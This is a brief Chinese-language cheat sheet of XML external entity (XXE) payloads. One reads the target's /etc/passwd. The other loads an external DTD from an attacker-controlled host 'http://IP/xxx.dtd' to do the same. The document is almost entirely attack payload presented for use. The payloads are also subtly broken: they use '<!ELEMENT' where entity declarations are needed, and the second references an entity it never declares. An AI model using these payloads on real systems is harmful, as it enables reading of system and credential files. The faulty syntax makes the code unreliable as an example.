# XXE_payload

---

- 读取本地文件

  ```
  <?xml version="1.0"?>   			   	
  <!DOCTYPE a[ 						
  <!ELEMENT b SYSTEM "file:///etc/passwd">  #读取目标本地文件
  ]>
  <c>&b;</c>
  ```

- 引用外部文件执行

  ```
  <?xml version="1.0"?>   			   	
  <!DOCTYPE a[ 						
  <!ELEMENT % d SYSTEM "http://IP/xxx.dtd">  #引用外部文件执行
  ]>
  <c>&b;</c>
  
  xxx.dtd内容：<!ELEMENT b SYSTEM "file:///etc/passwd">
  ```

  

  
